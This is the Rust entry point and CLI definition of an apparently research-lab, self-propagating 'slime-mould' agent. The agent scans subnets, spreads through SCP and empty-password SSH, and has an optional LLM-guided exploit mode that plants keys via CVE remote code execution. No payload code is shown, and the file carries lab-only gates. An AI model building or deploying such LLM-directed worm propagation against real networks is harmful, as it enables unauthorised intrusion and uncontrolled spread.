use clap::{Parser, ValueEnum};
use std::sync::Arc;
use tracing_subscriber::EnvFilter;

mod agent;
mod discovery;
#[cfg(target_os = "linux")]
mod ebpf;
mod exploit_db;
mod graph_sink;
mod icmp;
mod lineage;
mod lineage_crypto;
mod llm_loop;
mod propagation;
mod server;
mod tcp;
mod tls_store;
mod vuln_intel;

#[derive(Clone, Debug, ValueEnum)]
pub enum Mode {
    /// Entry point — starts on Host A, bootstraps lineage
    Seed,
    /// Propagated instance — receives lineage from parent via --lineage-b64
    Propagated,
    /// Smoke-test: generate an ephemeral ed25519 keypair, print the pubkey and
    /// fingerprint, verify file permissions, then clean up. Exit 0 on success.
    KeygenTest,
}

#[derive(Parser, Debug)]
#[command(
    name = "physarum-maze",
    about = "PF-1/PF-2 self-propagating maze agent (physarum slime-mould model)",
    long_about = "Listens for ICMP echo requests and TCP SYN packets to port 22, \
                  runs periodic /24 TCP-connect discovery via physarum-scanner, confirms SSH on discovered hosts, \
                  and propagates itself via SCP + empty-password SSH.  Detects already-\
                  colonized hosts and records secondary conduits.  Maintains a lineage \
                  JSON with D_ij path scores."
)]
pub struct Cli {
    /// Operating mode
    #[arg(long, default_value = "seed")]
    pub mode: Mode,

    /// Network interface to capture ICMP/TCP on.
    /// Use "auto" (default) to detect automatically from --llm-allowed-cidr:
    /// picks the interface whose IP is in the CIDR with the most specific prefix length.
    /// Fall back: first non-loopback IPv4 interface when CIDR is absent.
    #[arg(long, default_value = "auto", env = "PHYSARUM_IFACE")]
    pub interface: String,

    /// Propagated mode: base64-encoded lineage JSON from parent host
    #[arg(long, env = "PHYSARUM_LINEAGE_B64")]
    pub lineage_b64: Option<String>,

    /// Path to compiled eBPF bytecode (physarum-ebpf-observer-ebpf ELF).
    /// When provided, eBPF is used as a 5th stimulus source in addition to
    /// ICMP, TCP-SYN, periodic discovery, and the dormancy timer.
    /// Linux only — ignored on other platforms.
    #[arg(long, env = "PHYSARUM_BPF_BYTECODE")]
    pub bpf_bytecode: Option<std::path::PathBuf>,

    /// Maximum propagation depth — guards against infinite loops
    #[arg(long, default_value_t = 12, env = "PHYSARUM_MAX_HOPS")]
    pub max_hops: usize,

    /// Seconds without any stimulus before the agent goes dormant.
    /// Should be > discovery_interval_secs so startup sweeps keep the agent alive.
    #[arg(long, default_value_t = 360, env = "PHYSARUM_STIMULUS_TIMEOUT")]
    pub stimulus_timeout_secs: u64,

    /// Interval in seconds between startup /24 sweep runs (Issue #126).
    /// First tick fires immediately on startup — no external ping required.
    #[arg(long, default_value_t = 180, env = "PHYSARUM_DISCOVERY_INTERVAL")]
    pub discovery_interval_secs: u64,

    // ── LLM reasoning flags (all optional — disabled by default) ───────────
    /// OpenAI-compatible LLM endpoint (e.g. http://localhost:11434 for Ollama).
    /// When absent, LLM reasoning is disabled and the organism falls back to
    /// the standard dead-end scoring for targets without port 22.
    #[arg(long, env = "PHYSARUM_LLM_ENDPOINT")]
    pub llm_endpoint: Option<String>,

    /// LLM model name passed to the endpoint (e.g. "gpt-4o", "llama3").
    #[arg(long, default_value = "gpt-4o-mini", env = "PHYSARUM_LLM_MODEL")]
    pub llm_model: String,

    /// LLM API key — read from environment only, never from CLI positional args.
    /// Set via LLM_API_KEY in the environment; do not pass on the command line.
    #[arg(long, env = "LLM_API_KEY", hide = true)]
    pub llm_api_key: Option<String>,

    /// LLM request timeout in milliseconds.
    #[arg(long, default_value_t = 30_000, env = "PHYSARUM_LLM_TIMEOUT_MS")]
    pub llm_timeout_ms: u64,

    /// Log the full LLM prompt and raw response at DEBUG level.
    /// Lab-only — keep false (default) in production to avoid leaking target
    /// information into logs. Enable with PHYSARUM_LLM_LOG_PROMPTS=true.
    #[arg(long, default_value_t = false, env = "PHYSARUM_LLM_LOG_PROMPTS")]
    pub llm_log_prompts: bool,

    /// CIDR allowed for LLM-assisted propagation attempts.
    /// Use a broad range (e.g. 172.16.0.0/12 or 10.0.0.0/8) so that any
    /// Docker or AWS subnet in that range is accepted without reconfiguration.
    /// Must be set when --llm-endpoint is active; targets outside this CIDR
    /// are rejected by the policy gate regardless of LLM recommendation.
    #[arg(long, env = "PHYSARUM_LLM_ALLOWED_CIDR")]
    pub llm_allowed_cidr: Option<String>,

    /// Enable exploit-class propagation (CVE RCE → binary copy).
    /// Off by default. Requires --llm-endpoint. When enabled:
    ///   - PolicyGate allows PropagationMethod::Exploit
    ///   - OGNL FileOutputStream plants the ephemeral pubkey on the target
    ///     so the binary can be delivered exclusively via SCP.
    ///
    /// Lab-only. Do NOT enable outside an isolated test environment.
    #[arg(long, default_value_t = false, env = "PHYSARUM_EXPLOIT_ENABLED")]
    pub exploit_enabled: bool,

    /// Start the live organism graph server on the given port (default 8080).
    /// Serves the organism visualization frontend at / and the SSE event stream
    /// at /events. Seed mode only. Lab-use — no authentication on the API.
    #[arg(long, value_name = "PORT", default_missing_value = "8080", num_args = 0..=1, env = "PHYSARUM_SERVER_PORT")]
    pub server: Option<u16>,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(
            EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info")),
        )
        .init();

    let cli = Cli::parse();

    // Initialise lineage crypto key before any lineage serialisation occurs.
    match &cli.mode {
        Mode::Seed => lineage_crypto::init_seed(),
        Mode::Propagated => lineage_crypto::init_from_env(),
        Mode::KeygenTest => {}
    }

    let sink = if let Some(port) = cli.server {
        let sink = Arc::new(graph_sink::GraphSink::new());

        // Browser HTTP server — /, /graph, /events (Basic Auth) + legacy /report-colonization.
        let sink_browser = Arc::clone(&sink);
        tokio::spawn(async move {
            if let Err(e) = server::start(port, sink_browser).await {
                tracing::error!(err = %e, "organism server stopped");
            }
        });

        // mTLS back-channel — separate port (port + 1) so the browser is unaffected.
        // STORE is set here so llm_loop can issue per-agent certs during propagation (Issue #189).
        match tls_store::TlsStore::new() {
            Ok(store) => {
                let store = Arc::new(store);
                tls_store::STORE.set(Arc::clone(&store)).ok();
                let sink_mtls = Arc::clone(&sink);
                let mtls_port = port + 1;
                tokio::spawn(async move {
                    if let Err(e) =
                        server::start_mtls_backchannel(mtls_port, sink_mtls, store).await
                    {
                        tracing::error!(err = %e, "mTLS back-channel stopped");
                    }
                });
            }
            Err(e) => {
                tracing::warn!(err = %e, "TLS store init failed — mTLS back-channel disabled");
            }
        }

        Some(sink)
    } else {
        None
    };

    agent::run(cli, sink).await
}
